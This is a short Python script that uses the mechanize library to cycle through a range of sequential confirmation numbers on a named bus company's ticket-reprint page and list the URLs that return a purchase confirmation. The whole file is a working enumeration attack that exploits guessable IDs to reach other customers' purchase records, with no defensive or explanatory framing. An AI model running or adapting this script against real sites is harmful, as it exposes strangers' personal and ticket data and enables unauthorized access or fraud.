import mechanize

def testConfNum():
    confnum_links = []
    browser = mechanize.Browser()
    for confnum in range(18612850, 18612900):
        print("[*] Testing Confirmation Number: " + str(confnum))
        url = 'http://ws.peterpanbus.com/purchase/reprint.aspx?confnum='
        url += str(confnum)
        try:
            page = browser.open(url)
            if page is None:
                print(f"[-] Failed to open URL for confirmation number: {confnum}")
                continue
            source = page.read()
            if b'Thank you for your purchase' in source:
                confnum_links.append(url)
        except Exception as e:
            print(f"[-] Error: {e}")
            continue
    print('[+] The following links contain valid confirmation numbers:')
    for link in confnum_links:
        print(link)
    print('[+] Exiting program ...')

if __name__ == "__main__":
    testConfNum() 